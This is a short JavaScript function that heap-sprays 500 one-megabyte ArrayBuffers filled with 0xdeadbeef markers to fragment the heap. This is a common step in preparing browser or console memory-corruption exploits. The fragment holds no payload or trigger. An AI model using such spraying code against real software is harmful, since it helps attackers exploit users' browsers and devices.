// Spray 500MB of ArrayBuffers to force heap fragmentation
function heapSpray() {
  const spray = [];
  const chunkSize = 0x100000; // 1MB chunks (retail-safe)
  for (let i = 0; i < 500; i++) {
    spray.push(new ArrayBuffer(chunkSize));
    // Fill with marker values
    const view = new Uint32Array(spray[i]);
    for (let j = 0; j < view.length; j++) {
      view[j] = 0xdeadbeef;
    }
  }
  return spray;
}
